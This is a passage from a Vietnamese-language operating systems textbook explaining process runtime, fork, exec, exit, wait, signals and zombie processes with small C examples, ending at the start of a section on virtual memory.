<p><strong>Hình 1.</strong> Các trạng thái của một process trong suốt vòng đời của nó</p>
<blockquote>
<p><strong>Thời gian chạy của process (Process Runtime)</strong></p>
</blockquote>
<p>Lập trình viên thường sử dụng <strong>thời gian hoàn thành</strong> của một process như một thước đo để đánh giá hiệu năng của nó.<br />
Đối với các chương trình <strong>noninteractive</strong> (không tương tác), thời gian chạy nhanh hơn thường cho thấy một bản cài đặt tốt hơn hoặc tối ưu hơn.<br />
Ví dụ: khi so sánh hai chương trình tính <strong>prime factors</strong> (thừa số nguyên tố) của một số lớn, chương trình nào hoàn thành đúng nhiệm vụ nhanh hơn sẽ được ưu tiên.</p>
<p>Có hai cách đo khác nhau về <strong>thời gian chạy</strong> của một process:</p>
<ul>
<li>
<p>Cách thứ nhất là <strong>tổng wall time</strong> (hay <strong>wall-clock time</strong>).<br />
Wall time là khoảng thời gian từ khi bắt đầu đến khi hoàn thành một process — tức là thời gian trôi qua từ lúc process bắt đầu cho đến khi kết thúc, được đo bằng một chiếc đồng hồ treo tường.<br />
Wall time bao gồm:</p>
<ul>
<li>Thời gian process ở trạng thái <strong>Running</strong> (đang chạy) và thực thi trên CPU.</li>
<li>Thời gian process ở trạng thái <strong>Blocked</strong> (bị chặn) chờ một sự kiện như I/O.</li>
<li>Thời gian process ở trạng thái <strong>Ready</strong> (sẵn sàng) chờ đến lượt được lập lịch để chạy trên CPU.</li>
</ul>
<p>Trong các hệ thống <strong>multiprogrammed</strong> và <strong>timeshared</strong>, wall time của một process có thể chậm hơn do các process khác chạy đồng thời và chia sẻ tài nguyên hệ thống.</p>
</li>
<li>
<p>Cách thứ hai là <strong>tổng CPU time</strong> (hay <strong>process time</strong>).<br />
CPU time chỉ đo lượng thời gian process ở trạng thái <strong>Running</strong> và thực thi lệnh trên CPU.<br />
CPU time <strong>không</strong> bao gồm thời gian process ở trạng thái <strong>Blocked</strong> hoặc <strong>Ready</strong>.<br />
Do đó, tổng CPU time của một process <strong>không bị ảnh hưởng</strong> bởi các process khác chạy đồng thời trên hệ thống.</p>
</li>
</ul>
<h3 id="1323-tạo-và-hủy-process"><a class="header" href="#1323-tạo-và-hủy-process">13.2.3. Tạo (và hủy) process</a></h3>
<p>OS tạo một process mới khi một process hiện có thực hiện <strong>system call</strong> yêu cầu tạo process.<br />
Trong Unix, system call <strong>fork</strong> tạo ra một process mới.<br />
Process gọi <code>fork</code> là <strong>parent process</strong> (tiến trình cha) và process mới được tạo là <strong>child process</strong> (tiến trình con) của nó.</p>
<p>Ví dụ: nếu bạn chạy <code>a.out</code> trong shell, process shell sẽ gọi system call <code>fork</code> để yêu cầu OS tạo một child process mới dùng để chạy chương trình <code>a.out</code>.</p>
<p>Một ví dụ khác: một process trình duyệt web có thể gọi <code>fork</code> để tạo các child process xử lý các sự kiện duyệt web khác nhau.<br />
Trình duyệt web có thể tạo một child process để xử lý giao tiếp với web server khi người dùng tải một trang web, tạo một process khác để xử lý thao tác chuột của người dùng, và các process khác để xử lý các cửa sổ hoặc tab trình duyệt riêng biệt.</p>
<p>Một trình duyệt web đa tiến trình như vậy có thể tiếp tục xử lý yêu cầu của người dùng thông qua một số child process, đồng thời một số child process khác có thể bị chặn khi chờ phản hồi từ web server từ xa hoặc chờ thao tác chuột của người dùng.</p>
<p>Một <strong>process hierarchy</strong> (cây phân cấp tiến trình) của mối quan hệ cha–con tồn tại giữa tập các process đang hoạt động trong hệ thống.</p>
<p>Ví dụ: nếu process <em>A</em> gọi <code>fork</code> hai lần, sẽ tạo ra hai child process mới là <em>B</em> và <em>C</em>.<br />
Nếu process <em>C</em> tiếp tục gọi <code>fork</code>, một process mới <em>D</em> sẽ được tạo.<br />
Process <em>C</em> là con của <em>A</em> và là cha của <em>D</em>.<br />
Process <em>B</em> và <em>C</em> là <strong>siblings</strong> (anh/chị/em) vì chúng có cùng một parent process là <em>A</em>.<br />
Process <em>A</em> là <strong>ancestor</strong> (tổ tiên) của <em>B</em>, <em>C</em> và <em>D</em>.</p>
<p>Ví dụ này được minh họa trong <strong>Hình 2</strong>.</p>
<p><img src="C13-OS/_images/prochierarchy.png" alt="Process Hierarchy created from the example. A is the top ancestor with two children, B and C below it. C has one child, D, below it." /></p>
<p><strong>Hình 2.</strong> Ví dụ về cây phân cấp tiến trình được tạo bởi một parent process (<em>A</em>) gọi <code>fork</code> hai lần để tạo hai child process (<em>B</em> và <em>C</em>).<br />
Lời gọi <code>fork</code> của <em>C</em> tạo ra child process của nó là <em>D</em>.<br />
Để liệt kê cây phân cấp tiến trình trên hệ thống Linux, chạy <code>pstree</code> hoặc <code>ps -Aef --forest</code>.</p>
<p>Vì các process hiện có kích hoạt việc tạo process mới, nên một hệ thống cần ít nhất <strong>một process ban đầu</strong> để tạo ra các process khác.<br />
Khi khởi động (<strong>boot time</strong>), OS tạo <strong>process mức người dùng đầu tiên</strong> trong hệ thống.<br />
Process đặc biệt này, có tên là <code>init</code>, nằm ở đỉnh của cây phân cấp tiến trình và là <strong>ancestor</strong> của tất cả các process khác trong hệ thống.</p>
<h4 id="fork"><a class="header" href="#fork">fork</a></h4>
<p>System call <code>fork</code> được dùng để tạo một <strong>process</strong> (tiến trình) mới.<br />
Tại thời điểm gọi <code>fork</code>, <strong>child process</strong> (tiến trình con) sẽ <strong>kế thừa</strong> trạng thái thực thi (<strong>execution state</strong>) từ <strong>parent process</strong> (tiến trình cha).<br />
OS sẽ tạo một <strong>bản sao</strong> của trạng thái thực thi của process cha tại thời điểm nó gọi <code>fork</code>.<br />
Trạng thái thực thi này bao gồm:</p>
<ul>
<li>Nội dung <strong>address space</strong> (không gian địa chỉ) của process cha.</li>
<li>Giá trị các <strong>CPU register</strong> (thanh ghi CPU).</li>
<li>Bất kỳ <strong>system resource</strong> (tài nguyên hệ thống) nào đã được cấp phát (ví dụ: các file đang mở).</li>
</ul>
<p>OS cũng tạo một <strong>process control struct</strong> (cấu trúc điều khiển tiến trình) mới — đây là cấu trúc dữ liệu của OS dùng để quản lý child process — và gán cho child process một <strong>PID</strong> (Process ID) duy nhất.<br />
Sau khi OS tạo và khởi tạo process mới, <strong>child</strong> và <strong>parent</strong> sẽ chạy <strong>concurrently</strong> (đồng thời) — cả hai tiếp tục thực thi và xen kẽ nhau khi OS thực hiện <strong>context switch</strong> trên CPU.</p>
<p>Khi child process lần đầu tiên được OS lập lịch để chạy trên CPU, nó sẽ bắt đầu thực thi <strong>tại đúng vị trí mà parent đã dừng</strong> — tức là tại điểm trả về từ lời gọi <code>fork</code>.<br />
Điều này là do <code>fork</code> cấp cho child một bản sao trạng thái thực thi của parent (child sẽ chạy bằng bản sao này khi bắt đầu).</p>
<p>Từ góc nhìn của lập trình viên, <strong>một lời gọi <code>fork</code> sẽ trả về hai lần</strong>:</p>
<ul>
<li>Một lần trong ngữ cảnh của parent process đang chạy.</li>
<li>Một lần trong ngữ cảnh của child process đang chạy.</li>
</ul>
<p>Để phân biệt child và parent trong chương trình, lời gọi <code>fork</code> sẽ trả về <strong>giá trị khác nhau</strong> cho mỗi bên:</p>
<ul>
<li>Child process <strong>luôn</strong> nhận giá trị trả về là <code>0</code>.</li>
<li>Parent process nhận giá trị là <strong>PID của child</strong> (hoặc <code>-1</code> nếu <code>fork</code> thất bại).</li>
</ul>
<p>Ví dụ, đoạn code sau minh họa lời gọi system call <code>fork</code> tạo một child process mới từ process gọi nó:</p>
<pre><code class="language-c">pid_t pid;

pid = fork();   /* tạo một child process mới */

printf(&quot;pid = %d\n&quot;, pid);  /* cả parent và child đều thực thi dòng này */
</code></pre>
<p>Sau khi <code>fork</code> tạo child process mới, cả parent và child sẽ tiếp tục thực thi <strong>trong ngữ cảnh riêng của mình</strong>, tại điểm trả về của lời gọi <code>fork</code>.<br />
Cả hai process sẽ gán giá trị trả về của <code>fork</code> cho biến <code>pid</code> và đều gọi <code>printf</code>.<br />
Child process sẽ in ra <code>0</code>, còn parent process sẽ in ra <strong>PID của child</strong>.</p>
<p><strong>Hình 3</strong> minh họa ví dụ về cây tiến trình sau khi đoạn code trên được thực thi.<br />
Child process nhận <strong>bản sao chính xác</strong> của trạng thái thực thi của parent tại thời điểm <code>fork</code>, nhưng giá trị trong biến <code>pid</code> của nó khác với parent vì <code>fork</code> trả về <strong>PID của child</strong> (14 trong ví dụ này) cho parent, và <code>0</code> cho child.</p>
<p><img src="C13-OS/_images/fork.png" alt="forked child process gets copy of parent state, but fork returns a different value to the child and parent process" /></p>
<p><strong>Hình 3.</strong> Một process (PID 12) gọi <code>fork</code> để tạo child process mới.<br />
Child process nhận bản sao chính xác của address space và trạng thái thực thi của parent, nhưng có PID riêng (14).<br />
<code>fork</code> trả về <code>0</code> cho child và trả về PID của child (14) cho parent.</p>
<p>Thông thường, lập trình viên muốn child và parent thực hiện <strong>các tác vụ khác nhau</strong> sau khi gọi <code>fork</code>.<br />
Có thể sử dụng giá trị trả về khác nhau của <code>fork</code> để phân nhánh, cho phép parent và child thực thi các đoạn code khác nhau.</p>
<p>Ví dụ, đoạn code sau tạo một child process mới và dùng giá trị trả về của <code>fork</code> để phân nhánh thực thi:</p>
<pre><code class="language-c">pid_t pid;

pid = fork();   /* tạo một child process mới */

if (pid == 0) {
    /* chỉ child process thực thi đoạn code này */
    ...
} else if (pid != -1)  {
    /* chỉ parent process thực thi đoạn code này */
    ...
}
</code></pre>
<p>Điều quan trọng cần nhớ là <strong>ngay khi được tạo</strong>, child và parent sẽ chạy <strong>đồng thời</strong> trong ngữ cảnh thực thi riêng của mình,<br />
thay đổi các bản sao biến chương trình riêng biệt và có thể thực thi các nhánh code khác nhau.</p>
<p>Hãy xem <a href="C13-OS/_attachments/fork.c">chương trình sau</a>, trong đó có lời gọi <code>fork</code> kết hợp với phân nhánh dựa trên giá trị <code>pid</code> để kích hoạt parent và child thực thi các đoạn code khác nhau (ví dụ này cũng minh họa lời gọi <code>getpid</code> trả về PID của process đang gọi):</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(void) {

    pid_t pid, mypid;

    printf(&quot;A\n&quot;);

    pid = fork();   /* create a new child process */

    if(pid == -1) {  /* check and handle error return value */
        printf(&quot;fork failed!\n&quot;);
        exit(pid);
    }

    if (pid == 0) { /* the child process */
        mypid = getpid();
        printf(&quot;Child: fork returned %d, my pid %d\n&quot;, pid, mypid);

    } else  {  /* the parent process */
        mypid = getpid();
        printf(&quot;Parent: fork returned %d, my pid %d\n&quot;, pid, mypid);
    }

    printf(&quot;B:%d\n&quot;, mypid);

    return 0;
}
</code></pre>
<p>Khi chạy, chương trình này có thể cho ra kết quả như sau (giả sử PID của <strong>parent</strong> là 12 và PID của <strong>child</strong> là 14):</p>
<pre><code>A
Parent: fork returned 14, my pid 12
B:12
Child: fork returned 0, my pid 14
B:14
</code></pre>
<p>Trên thực tế, kết quả của chương trình có thể xuất hiện theo bất kỳ thứ tự nào trong <strong>Bảng 1</strong> (và nếu bạn chạy chương trình nhiều lần, bạn sẽ thường thấy nhiều hơn một thứ tự xuất hiện).<br />
Trong <strong>Bảng 1</strong>, parent in ra <code>B:12</code> và child in ra <code>B:14</code> trong ví dụ này, nhưng giá trị PID chính xác sẽ thay đổi theo từng lần chạy.</p>
<div class="table-wrapper"><table><thead><tr><th>Option 1</th><th>Option 2</th><th>Option 3</th><th>Option 4</th><th>Option 5</th><th>Option 6</th></tr></thead><tbody>
<tr><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td></tr>
<tr><td><code>Parent…</code></td><td><code>Parent…</code></td><td><code>Parent…</code></td><td><code>Child…</code></td><td><code>Child…</code></td><td><code>Child…</code></td></tr>
<tr><td><code>Child…</code></td><td><code>Child…</code></td><td><code>B:12</code></td><td><code>Parent…</code></td><td><code>Parent…</code></td><td><code>B:14</code></td></tr>
<tr><td><code>B:12</code></td><td><code>B:14</code></td><td><code>Child…</code></td><td><code>B:12</code></td><td><code>B:14</code></td><td><code>Parent…</code></td></tr>
<tr><td><code>B:14</code></td><td><code>B:12</code></td><td><code>B:14</code></td><td><code>B:14</code></td><td><code>B:12</code></td><td><code>B:12</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Sáu thứ tự xuất hiện kết quả có thể xảy ra của chương trình ví dụ.</p>
<p>Sáu thứ tự kết quả khác nhau này có thể xảy ra vì sau khi system call <code>fork</code> trả về, <strong>parent</strong> và <strong>child</strong> chạy <strong>concurrently</strong> (đồng thời) và có thể được lập lịch chạy trên CPU theo nhiều cách khác nhau, dẫn đến bất kỳ sự xen kẽ nào của các chuỗi lệnh.</p>
<p>Hãy xem <strong>Hình 4</strong> minh họa <strong>execution time line</strong> (dòng thời gian thực thi) của chương trình.<br />
Đường nét đứt biểu thị việc thực thi đồng thời của hai process.<br />
Tùy thuộc vào thời điểm mỗi process được lập lịch chạy trên CPU, một process có thể thực thi cả hai lệnh <code>printf</code> của nó trước process kia, hoặc việc thực thi hai lệnh <code>printf</code> của chúng có thể xen kẽ nhau, dẫn đến bất kỳ kết quả nào trong bảng trên.</p>
<p>Vì chỉ có một process (parent) tồn tại trước khi gọi <code>fork</code>, nên <code>A</code> <strong>luôn</strong> được in ra bởi parent trước bất kỳ kết quả nào sau lời gọi <code>fork</code>.</p>
<p><img src="C13-OS/_images/forkprint.png" alt="after the parent calls fork, both processes execute concurrently" /></p>
<p><strong>Hình 4.</strong> Dòng thời gian thực thi của chương trình. Chỉ có parent tồn tại trước khi gọi <code>fork</code>. Sau khi <code>fork</code> trả về, cả hai chạy đồng thời (được biểu diễn bằng các đường nét đứt).</p>
<h3 id="1324-exec"><a class="header" href="#1324-exec">13.2.4. exec</a></h3>
<p>Thông thường, một process mới được tạo ra để thực thi một chương trình <strong>khác</strong> với chương trình của parent process.<br />
Điều này có nghĩa là <code>fork</code> thường được gọi để tạo một process với mục đích chạy một chương trình mới từ điểm bắt đầu của nó (tức là bắt đầu thực thi từ lệnh đầu tiên).</p>
<p>Ví dụ: nếu người dùng gõ <code>./a.out</code> trong shell, process shell sẽ gọi <code>fork</code> để tạo một child process mới chạy <code>a.out</code>.<br />
Vì là hai process riêng biệt, shell và process <code>a.out</code> được bảo vệ khỏi nhau; chúng không thể can thiệp vào trạng thái thực thi của nhau.</p>
<p>Mặc dù <code>fork</code> tạo ra child process mới, nhưng nó <strong>không</strong> khiến child chạy <code>a.out</code>.<br />
Để khởi tạo child process chạy một chương trình mới, child process sẽ gọi một trong các system call <strong>exec</strong>.<br />
Unix cung cấp một họ các system call exec, yêu cầu OS <strong>overlay</strong> (ghi đè) image của process gọi bằng một image mới từ file thực thi nhị phân.</p>
<p>Nói cách khác, một system call exec yêu cầu OS ghi đè nội dung <strong>address space</strong> của process gọi bằng chương trình <code>a.out</code> được chỉ định và khởi tạo lại trạng thái thực thi của nó để bắt đầu chạy từ lệnh đầu tiên trong chương trình <code>a.out</code>.</p>
<p>Một ví dụ về system call exec là <code>execvp</code>, với prototype hàm như sau:</p>
<pre><code class="language-c">int execvp(char *filename, char *argv[]);
</code></pre>
<ul>
<li>Tham số <code>filename</code> chỉ định tên của chương trình thực thi nhị phân để khởi tạo image của process.</li>
<li><code>argv</code> chứa các đối số dòng lệnh sẽ được truyền vào hàm <code>main</code> của chương trình khi nó bắt đầu thực thi.</li>
</ul>
<p>Dưới đây là ví dụ đoạn code, khi chạy sẽ tạo một child process mới để chạy <code>a.out</code>:</p>
<pre><code class="language-c">pid_t pid;
int  ret;
char *argv[2];

argv[0] = &quot;a.out&quot;;  // initialize command line arguments for main
argv[1] = NULL;

pid = fork();
if (pid == 0) { /* child process */
    ret = execvp(&quot;a.out&quot;, argv);
    if (ret &lt; 0) {
        printf(&quot;Error: execvp returned!!!\n&quot;);
        exit(ret);
    }
}
</code></pre>
<p>Biến <code>argv</code> được khởi tạo bằng giá trị của đối số <code>argv</code> được truyền vào hàm <code>main</code> của chương trình <code>a.out</code>:</p>
<pre><code class="language-c">int main(int argc, char *argv) { ... }
</code></pre>
<p><code>execvp</code> sẽ xác định giá trị cần truyền cho <code>argc</code> dựa trên giá trị <code>argv</code> này (trong trường hợp này là 1).</p>
<p><strong>Hình 5</strong> cho thấy cây phân cấp tiến trình (<strong>process hierarchy</strong>) sẽ trông như thế nào sau khi thực thi đoạn code này:</p>
<p><img src="C13-OS/_images/exec.png" alt="after fork child calls exec" /></p>
<p><strong>Hình 5.</strong> Khi <strong>child process</strong> gọi <code>execvp</code> (bên trái), OS sẽ thay thế <strong>image</strong> của nó bằng <code>a.out</code> (bên phải) và khởi tạo child process để bắt đầu chạy chương trình <code>a.out</code> từ đầu.</p>
<p>Một điểm cần lưu ý trong ví dụ code trên là thông báo lỗi có vẻ “lạ” ngay sau lời gọi <code>execvp</code>: tại sao việc <strong>trả về</strong> từ một system call <code>exec</code> lại là lỗi?<br />
Nếu system call <code>exec</code> thành công, thì đoạn code phát hiện và xử lý lỗi ngay sau đó sẽ <strong>không bao giờ</strong> được thực thi, vì process lúc này sẽ đang thực thi code trong chương trình <code>a.out</code> thay vì đoạn code hiện tại (nội dung <strong>address space</strong> của process đã bị thay đổi bởi <code>exec</code>).</p>
<p>Nói cách khác, khi một lời gọi hàm <code>exec</code> thành công, process <strong>không</strong> tiếp tục thực thi tại điểm trả về của lời gọi <code>exec</code>.<br />
Chính vì hành vi này, đoạn code sau tương đương với đoạn code ở trên (tuy nhiên, đoạn ở trên thường dễ hiểu hơn):</p>
<pre><code class="language-c">pid_t pid;
int ret;

pid = fork();
if (pid == 0) { /* child process */
    ret = execvp(&quot;a.out&quot;, argv);
    printf(&quot;Error: execvp returned!!!\n&quot;);  /* chỉ chạy nếu execvp thất bại */
    exit(ret);
}
</code></pre>
<h3 id="1325-exit-và-wait"><a class="header" href="#1325-exit-và-wait">13.2.5. exit và wait</a></h3>
<p>Để kết thúc, một process sẽ gọi system call <code>exit</code>, yêu cầu OS dọn dẹp hầu hết trạng thái của process.<br />
Sau khi chạy code thoát (<strong>exit code</strong>), process sẽ thông báo cho <strong>parent process</strong> rằng nó đã thoát.<br />
Parent chịu trách nhiệm dọn dẹp phần trạng thái còn lại của child process đã thoát khỏi hệ thống.</p>
<p>Process có thể bị yêu cầu thoát theo nhiều cách:</p>
<ol>
<li>
<p>Process hoàn thành toàn bộ code ứng dụng của nó.<br />
Việc trả về từ hàm <code>main</code> sẽ dẫn đến việc process gọi system call <code>exit</code>.</p>
</li>
<li>
<p>Process thực hiện một hành động không hợp lệ, chẳng hạn như chia cho 0 hoặc dereference một <strong>null pointer</strong>, dẫn đến việc nó bị thoát.</p>
</li>
<li>
<p>Process nhận một <strong>signal</strong> từ OS hoặc từ process khác, yêu cầu nó thoát<br />
(thực tế, chia cho 0 và dereference null pointer sẽ khiến OS gửi cho process các signal <code>SIGFPE</code> và <code>SIGSEGV</code> yêu cầu nó thoát).</p>
</li>
</ol>
<h4 id="signals"><a class="header" href="#signals"><strong>Signals</strong></a></h4>
<p><strong>Signal</strong> là một <strong>software interrupt</strong> (ngắt phần mềm) mà OS gửi tới một process.<br />
Signal là một phương thức để các process có liên quan giao tiếp với nhau.<br />
OS cung cấp một <strong>interface</strong> để một process gửi signal tới process khác, và để OS giao tiếp với process (ví dụ: gửi signal <code>SIGSEGV</code> khi process dereference một null pointer).</p>
<p>Khi một process nhận được signal, nó sẽ bị ngắt để chạy code <strong>signal handler</strong> đặc biệt.<br />
Một hệ thống định nghĩa một số lượng cố định các signal để truyền đạt các ý nghĩa khác nhau, mỗi signal được phân biệt bằng một số hiệu duy nhất.<br />
OS triển khai các <strong>default signal handler</strong> (trình xử lý tín hiệu mặc định) cho từng loại signal, nhưng lập trình viên có thể đăng ký code signal handler ở mức người dùng để ghi đè hành động mặc định của hầu hết các signal trong ứng dụng của họ.</p>
<p>Phần <strong>Signals</strong> sẽ chứa thêm thông tin chi tiết về signal và cách xử lý signal.</p>
<p>Nếu một <strong>shell process</strong> muốn kết thúc <strong>child process</strong> đang chạy <code>a.out</code>, nó có thể gửi cho child một <strong>signal</strong> <code>SIGKILL</code>.<br />
Khi child process nhận được signal này, nó sẽ chạy <strong>signal handler</strong> cho <code>SIGKILL</code>, trong đó gọi <code>exit</code> để kết thúc child process.</p>
<p>Nếu người dùng nhấn <strong>CTRL-C</strong> trong một Unix shell đang chạy một chương trình, child process sẽ nhận signal <code>SIGINT</code>.<br />
<strong>Default signal handler</strong> (trình xử lý tín hiệu mặc định) cho <code>SIGINT</code> cũng gọi <code>exit</code>, dẫn đến việc child process thoát.</p>
<p>Sau khi thực thi system call <code>exit</code>, OS sẽ gửi một signal <code>SIGCHLD</code> tới <strong>parent process</strong> của process vừa thoát để thông báo rằng child của nó đã kết thúc.<br />
Child lúc này trở thành một <strong>zombie process</strong> — nó chuyển sang trạng thái <strong>Exited</strong> và không thể chạy lại trên CPU.<br />
Trạng thái thực thi của zombie process được OS dọn dẹp một phần, nhưng OS vẫn giữ lại một số thông tin về nó, bao gồm cả cách mà nó đã kết thúc.</p>
<p><strong>Parent process</strong> sẽ <strong>reap</strong> (thu hồi) zombie child của mình (dọn dẹp phần trạng thái còn lại khỏi hệ thống) bằng cách gọi system call <code>wait</code>.<br />
Nếu parent process gọi <code>wait</code> <strong>trước</strong> khi child process thoát, parent sẽ bị <strong>block</strong> cho đến khi nhận được signal <code>SIGCHLD</code> từ child.</p>
<p>System call <code>waitpid</code> là một phiên bản của <code>wait</code> có thêm đối số PID, cho phép parent block trong khi chờ một child process cụ thể kết thúc.</p>
<p><strong>Hình 6</strong> minh họa trình tự các sự kiện xảy ra khi một process thoát:</p>
<p><img src="C13-OS/_images/exit.png" alt="child exits" /></p>
<p><strong>Hình 6.</strong> Quá trình thoát của process.</p>
<ul>
<li><strong>Trái:</strong> Child process gọi system call <code>exit</code> để dọn dẹp phần lớn trạng thái thực thi của nó.</li>
<li><strong>Giữa:</strong> Sau khi chạy <code>exit</code>, child process trở thành zombie (ở trạng thái <strong>Exited</strong> và không thể chạy lại), và parent process nhận signal <code>SIGCHLD</code> thông báo rằng child đã thoát.</li>
<li><strong>Phải:</strong> Parent gọi <code>waitpid</code> để thu hồi zombie child (dọn dẹp phần trạng thái còn lại của child khỏi hệ thống).</li>
</ul>
<p>Vì parent và child process chạy <strong>concurrently</strong> (đồng thời), nên parent có thể gọi <code>wait</code> <strong>trước</strong> khi child thoát, hoặc child có thể thoát <strong>trước</strong> khi parent gọi <code>wait</code>.</p>
<ul>
<li>Nếu child vẫn đang chạy khi parent gọi <code>wait</code>, parent sẽ bị block cho đến khi child thoát (parent chuyển sang trạng thái <strong>Blocked</strong> chờ sự kiện signal <code>SIGCHLD</code>).</li>
<li>Hành vi block này có thể quan sát được nếu bạn chạy một chương trình (<code>a.out</code>) ở <strong>foreground</strong> của shell — shell sẽ không in ra prompt cho đến khi <code>a.out</code> kết thúc, cho thấy shell (parent) đang bị block trong lời gọi <code>wait</code>, chờ nhận <code>SIGCHLD</code> từ child process đang chạy <code>a.out</code>.</li>
</ul>
<p>Lập trình viên cũng có thể thiết kế code của parent process sao cho nó <strong>không bao giờ</strong> bị block khi chờ child process thoát.<br />
Nếu parent triển khai một <strong>signal handler</strong> cho <code>SIGCHLD</code> và bên trong có lời gọi <code>wait</code>, thì parent chỉ gọi <code>wait</code> khi thực sự có child process đã thoát để thu hồi, và do đó sẽ không bị block trong lời gọi <code>wait</code>.</p>
<p>Hành vi này có thể thấy khi chạy một chương trình ở <strong>background</strong> trong shell (<code>a.out &amp;</code>).<br />
Shell sẽ tiếp tục thực thi, in ra prompt và chạy lệnh khác trong khi child của nó chạy <code>a.out</code>.</p>
<p>Ví dụ để thấy sự khác biệt giữa parent bị block trong <code>wait</code> và parent không block (chỉ gọi <code>wait</code> bên trong <code>SIGCHLD</code> handler) — hãy chạy một chương trình đủ lâu để nhận thấy sự khác biệt:</p>
<pre><code class="language-bash">$ a.out        # shell process fork child và gọi wait

$ a.out &amp;      # shell process fork child nhưng không gọi wait
$ ps           # shell có thể chạy ps và a.out đồng thời
</code></pre>
<p>Dưới đây là ví dụ đoạn code chứa các system call <code>fork</code>, <code>exec</code>, <code>exit</code> và <code>wait</code> (đã bỏ phần xử lý lỗi để dễ đọc).<br />
Ví dụ này được thiết kế để kiểm tra mức độ hiểu của bạn về các system call này và tác động của chúng đến quá trình thực thi của các process.</p>
<p>Trong ví dụ:</p>
<ul>
<li>Parent process tạo một child process và chờ nó thoát.</li>
<li>Child process sau đó fork một child khác để chạy chương trình <code>a.out</code> (child đầu tiên là parent của child thứ hai).</li>
<li>Sau đó, child đầu tiên chờ child của nó thoát.</li>
</ul>
<pre><code class="language-c">pid_t pid1, pid2, ret;
int status;

printf(&quot;A\n&quot;);

pid1 = fork();
if (pid1 == 0 ) {       /* child 1 */
    printf(&quot;B\n&quot;);

    pid2 = fork();
    if (pid2 == 0 ){    /* child 2 */
        printf(&quot;C\n&quot;);
        execvp(&quot;a.out&quot;, NULL);
    } else {            /* child 1 (parent of child 2) */
        ret = wait(&amp;status);
        printf(&quot;D\n&quot;);
        exit(0);
    }
} else {                /* original parent */
    printf(&quot;E\n&quot;);
    ret = wait(&amp;status);
    printf(&quot;F\n&quot;);
}
</code></pre>
<p><strong>Hình 7</strong> minh họa <strong>execution time line</strong> (dòng thời gian thực thi) của các sự kiện <strong>create / running / blocked / exit</strong> của process khi thực thi ví dụ ở trên.<br />
Các <strong>đường nét đứt</strong> biểu thị khoảng thời gian khi quá trình thực thi của một process <strong>chồng lấn</strong> với process con hoặc hậu duệ của nó: các process này chạy <strong>concurrently</strong> (đồng thời) và có thể được lập lịch trên CPU theo bất kỳ thứ tự nào.<br />
Các <strong>đường liền</strong> biểu thị <strong>sự phụ thuộc</strong> trong quá trình thực thi giữa các process.</p>
<p>Ví dụ: <strong>Child 1</strong> không thể gọi <code>exit</code> cho đến khi nó đã <strong>reap</strong> (thu hồi) xong <strong>child process</strong> đã thoát của mình là <strong>Child 2</strong>.<br />
Khi một process gọi <code>wait</code>, nó sẽ <strong>block</strong> cho đến khi child của nó thoát.<br />
Khi một process gọi <code>exit</code>, nó sẽ <strong>không bao giờ</strong> chạy lại.</p>
<p>Kết quả in ra của chương trình được chú thích dọc theo dòng thời gian thực thi của từng process tại các điểm mà lệnh <code>printf</code> tương ứng có thể xảy ra.</p>
<p><img src="C13-OS/_images/forkwait.png" alt="the execution time line for fork-wait example" /></p>
<p><strong>Hình 7.</strong> Dòng thời gian thực thi của chương trình ví dụ, cho thấy một trình tự có thể xảy ra của các lời gọi <code>fork</code>, <code>exec</code>, <code>wait</code> và <code>exit</code> từ ba process.<br />
Các <strong>đường liền</strong> biểu thị sự phụ thuộc về thứ tự thực thi giữa các process, và các <strong>đường nét đứt</strong> biểu thị các điểm thực thi đồng thời.<br />
<strong>Parent</strong> là parent process của <strong>Child 1</strong>, và <strong>Child 1</strong> là parent process của <strong>Child 2</strong>.</p>
<p>Sau khi các lời gọi <code>fork</code> được thực hiện trong chương trình này, <strong>parent process</strong> và <strong>child process</strong> đầu tiên sẽ chạy đồng thời.<br />
Do đó, lời gọi <code>wait</code> trong parent có thể <strong>xen kẽ</strong> với bất kỳ lệnh nào của child.</p>
<p>Ví dụ: parent process có thể gọi <code>wait</code> và bị block <strong>trước</strong> khi child process của nó gọi <code>fork</code> để tạo child process của riêng nó.</p>
<p><strong>Bảng 2</strong> liệt kê tất cả các kết quả đầu ra có thể có khi chạy chương trình ví dụ.</p>
<div class="table-wrapper"><table><thead><tr><th>Option 1</th><th>Option 2</th><th>Option 3</th><th>Option 4</th></tr></thead><tbody>
<tr><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td><td><code>A</code></td></tr>
<tr><td><code>B</code></td><td><code>B</code></td><td><code>B</code></td><td><code>E</code></td></tr>
<tr><td><code>C</code></td><td><code>C</code></td><td><code>E</code></td><td><code>B</code></td></tr>
<tr><td><code>D</code></td><td><code>E</code></td><td><code>C</code></td><td><code>C</code></td></tr>
<tr><td><code>E</code></td><td><code>D</code></td><td><code>D</code></td><td><code>D</code></td></tr>
<tr><td><code>F</code></td><td><code>F</code></td><td><code>F</code></td><td><code>F</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Tất cả các thứ tự kết quả có thể có từ chương trình.</p>
<p>Các kết quả trong <strong>Bảng 2</strong> đều có thể xảy ra vì <strong>parent process</strong> chạy đồng thời với các process hậu duệ của nó cho đến khi nó gọi <code>wait</code>.<br />
Do đó, lời gọi <code>printf(&quot;E\n&quot;)</code> của parent có thể được xen kẽ tại bất kỳ điểm nào giữa lúc bắt đầu và lúc kết thúc của các process hậu duệ của nó.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="133-bộ-nhớ-ảo-virtual-memory"><a class="header" href="#133-bộ-nhớ-ảo-virtual-memory">13.3. Bộ nhớ ảo (Virtual Memory)</a></h2>
<p><strong>Process abstraction</strong> (trừu tượng hóa tiến trình) của OS cung cấp cho mỗi process một <strong>virtual memory space</strong> (không gian bộ nhớ ảo).<br />
<strong>Virtual memory</strong> (bộ nhớ ảo) là một abstraction cung cấp cho mỗi process <strong>một không gian địa chỉ logic riêng tư</strong> để lưu trữ lệnh và dữ liệu của nó.</p>
<p>Không gian địa chỉ ảo của mỗi process có thể được hình dung như một mảng các byte có thể địa chỉ hóa, từ địa chỉ <code>0</code> đến một địa chỉ tối đa nào đó.<br />
Ví dụ: trên hệ thống 32-bit, địa chỉ tối đa là <code>2^32 - 1</code>.<br />
Các process <strong>không thể</strong> truy cập nội dung của không gian địa chỉ của nhau.</p>
